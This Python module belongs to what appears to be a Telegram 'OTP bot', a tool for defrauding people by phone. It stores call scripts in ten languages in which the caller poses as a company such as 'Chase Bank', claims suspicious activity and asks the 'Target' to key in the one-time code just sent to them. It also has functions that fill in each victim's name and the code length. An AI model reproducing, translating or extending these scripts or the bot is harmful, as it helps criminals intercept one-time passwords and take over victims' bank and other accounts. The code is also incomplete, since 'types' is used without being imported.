# services/language_service.py
"""
Language support service for OTP-Bot-Telegram.
Provides multi-language support for call scripts, TTS, and user-facing messages.
Supports: EN, FR, ES, DE, IT, PT, NL, PL, RU, TR.
"""
import logging
from typing import Dict, Optional, List, Tuple
from pathlib import Path

from core.files import read_user_file, write_user_file, ensure_user_path

logger = logging.getLogger("OTP-Bot.language")

# ======================================================================
# Language configuration
# ======================================================================
SUPPORTED_LANGUAGES = {
    "en": {"name": "English", "flag": "🇺🇸"},
    "fr": {"name": "Français", "flag": "🇫🇷"},
    "es": {"name": "Español", "flag": "🇪🇸"},
    "de": {"name": "Deutsch", "flag": "🇩🇪"},
    "it": {"name": "Italiano", "flag": "🇮🇹"},
    "pt": {"name": "Português", "flag": "🇵🇹"},
    "nl": {"name": "Nederlands", "flag": "🇳🇱"},
    "pl": {"name": "Polski", "flag": "🇵🇱"},
    "ru": {"name": "Русский", "flag": "🇷🇺"},
    "tr": {"name": "Türkçe", "flag": "🇹🇷"},
}

# ======================================================================
# Call script templates (per language)
# ======================================================================
CALL_TEMPLATES = {
    "en": {
        "checkifhuman": "Hello, I am calling from {company}. Please press 1 to confirm you are {name}.",
        "explain": "Thank you for confirming, {name}. We have detected suspicious activity and need to verify some details.",
        "askdigits": "Please enter the {digits} digit code sent to you using your keypad.",
    },
    "fr": {
        "checkifhuman": "Bonjour, je vous appelle de la part de {company}. Veuillez appuyer sur 1 pour confirmer que vous êtes {name}.",
        "explain": "Merci de confirmer, {name}. Nous avons détecté une activité suspecte et devons vérifier certains détails.",
        "askdigits": "Veuillez saisir le code à {digits} chiffres qui vous a été envoyé avec votre clavier.",
    },
    "es": {
        "checkifhuman": "Hola, te llamo de {company}. Por favor presiona 1 para confirmar que eres {name}.",
        "explain": "Gracias por confirmar, {name}. Hemos detectado actividad sospechosa y necesitamos verificar algunos detalles.",
        "askdigits": "Por favor ingresa el código de {digits} dígitos que te fue enviado en tu teclado.",
    },
    "de": {
        "checkifhuman": "Hallo, ich rufe von {company} an. Bitte drücken Sie 1, um zu bestätigen, dass Sie {name} sind.",
        "explain": "Danke für die Bestätigung, {name}. Wir haben verdächtige Aktivitäten erkannt und müssen einige Details überprüfen.",
        "askdigits": "Bitte geben Sie den {digits}-stelligen Code ein, den Sie auf Ihrer Tastatur erhalten haben.",
    },
    "it": {
        "checkifhuman": "Ciao, ti chiamo da {company}. Per favore premi 1 per confermare che sei {name}.",
        "explain": "Grazie per aver confermato, {name}. Abbiamo rilevato attività sospette e dobbiamo verificare alcuni dettagli.",
        "askdigits": "Inserisci il codice di {digits} cifre che ti è stato inviato sulla tastiera.",
    },
    "pt": {
        "checkifhuman": "Olá, estou ligando de {company}. Por favor, pressione 1 para confirmar que você é {name}.",
        "explain": "Obrigado por confirmar, {name}. Detectamos atividade suspeita e precisamos verificar alguns detalhes.",
        "askdigits": "Por favor, digite o código de {digits} dígitos que foi enviado para você no teclado.",
    },
    "nl": {
        "checkifhuman": "Hallo, ik bel van {company}. Druk op 1 om te bevestigen dat u {name} bent.",
        "explain": "Bedankt voor uw bevestiging, {name}. We hebben verdachte activiteit gedetecteerd en moeten enkele details verifiëren.",
        "askdigits": "Voer de {digits}-cijferige code in die u op uw toetsenbord heeft ontvangen.",
    },
    "pl": {
        "checkifhuman": "Cześć, dzwonię z {company}. Naciśnij 1, aby potwierdzić, że jesteś {name}.",
        "explain": "Dziękujemy za potwierdzenie, {name}. Wykryliśmy podejrzaną aktywność i musimy zweryfikować kilka szczegółów.",
        "askdigits": "Proszę wprowadzić {digits}-cyfrowy kod, który został wysłany na Twoją klawiaturę.",
    },
    "ru": {
        "checkifhuman": "Здравствуйте, я звоню из {company}. Пожалуйста, нажмите 1, чтобы подтвердить, что вы {name}.",
        "explain": "Спасибо за подтверждение, {name}. Мы обнаружили подозрительную активность и должны проверить некоторые детали.",
        "askdigits": "Пожалуйста, введите {digits}-значный код, который был отправлен вам на клавиатуру.",
    },
    "tr": {
        "checkifhuman": "Merhaba, {company} şirketinden arıyorum. Lütfen {name} olduğunuzu onaylamak için 1'e basın.",
        "explain": "Doğruladığınız için teşekkürler, {name}. Şüpheli aktivite tespit ettik ve bazı detayları doğrulamamız gerekiyor.",
        "askdigits": "Lütfen klavyenizde size gönderilen {digits} basamaklı kodu girin.",
    },
}

# ======================================================================
# User language management
# ======================================================================
def get_user_language(user_id: str) -> str:
    """
    Get the user's selected language.
    
    Args:
        user_id: User ID
    
    Returns:
        Language code (en, fr, es, etc.) – default 'en'
    """
    return read_user_file(user_id, "Language.txt", "en")

def set_user_language(user_id: str, language: str) -> bool:
    """
    Set the user's selected language.
    
    Args:
        user_id: User ID
        language: Language code (must be in SUPPORTED_LANGUAGES)
    
    Returns:
        True if set successfully, False if language not supported
    """
    if language not in SUPPORTED_LANGUAGES:
        return False
    write_user_file(user_id, "Language.txt", language)
    logger.info(f"User {user_id} language set to {language}")
    return True

def get_supported_languages_list() -> str:
    """
    Get a formatted list of supported languages for display.
    
    Returns:
        Formatted string with language codes, names, and flags
    """
    lines = []
    for code, info in SUPPORTED_LANGUAGES.items():
        lines.append(f"{info['flag']} {code.upper()} – {info['name']}")
    return "\n".join(lines)

# ======================================================================
# Call script generation with language support
# ======================================================================
def get_call_script(
    user_id: str,
    page: str,
    name: str = None,
    company: str = None,
    digits: str = None,
) -> str:
    """
    Generate a call script in the user's selected language.
    
    Args:
        user_id: User ID
        page: Page name ('checkifhuman', 'explain', 'askdigits')
        name: Target name (optional, for templating)
        company: Company name (optional)
        digits: OTP digits length (optional)
    
    Returns:
        Formatted script string in the user's language
    """
    lang = get_user_language(user_id)
    templates = CALL_TEMPLATES.get(lang, CALL_TEMPLATES["en"])
    template = templates.get(page, templates.get("checkifhuman", ""))
    
    # Fill in template variables
    name = name or read_user_file(user_id, "Name.txt", "Customer")
    company = company or read_user_file(user_id, "Company Name.txt", "your company")
    digits = digits or read_user_file(user_id, "Digits.txt", "6")
    
    return template.format(name=name, company=company, digits=digits)

# ======================================================================
# TTS generation with language-aware fallback
# ======================================================================
def get_tts_params(user_id: str, voice_id: Optional[str] = None) -> Tuple[str, str]:
    """
    Get generic TTS parameters for compatibility.

    Returns a sensible default; ElevenLabs handles language selection internally.
    """
    return "en", "com"

# ======================================================================
# Language selection handler for Telegram
# ======================================================================
def get_language_selection_keyboard(
    current_lang: str = None,
    callback_prefix: str = "lang_select_",
) -> types.InlineKeyboardMarkup:
    """
    Build an inline keyboard for language selection.
    
    Args:
        current_lang: Currently selected language code
        callback_prefix: Prefix for callback data
    
    Returns:
        InlineKeyboardMarkup with language buttons
    """
    keyboard = types.InlineKeyboardMarkup(row_width=3)
    buttons = []
    for code, info in SUPPORTED_LANGUAGES.items():
        is_selected = current_lang == code
        marker = "✅" if is_selected else ""
        label = f"{info['flag']} {code.upper()} {marker}"
        callback_data = f"{callback_prefix}{code}"
        buttons.append(types.InlineKeyboardButton(label, callback_data=callback_data))
    
    # Arrange in rows of 3
    for i in range(0, len(buttons), 3):
        keyboard.row(*buttons[i:i+3])
    
    return keyboard

# ======================================================================
# Example usage (comment out when importing)
# ======================================================================
if __name__ == "__main__":
    # Test language listing
    print("Supported languages:")
    print(get_supported_languages_list())
    
    # Test script generation for a user
    test_user = "test_user"
    set_user_language(test_user, "es")
    script = get_call_script(test_user, "checkifhuman", "John", "Chase Bank")
    print(f"\nSpanish script:\n{script}")
    
    # Test TTS parameters
    params = get_tts_params(test_user)
    print(f"\nTTS params: {params}")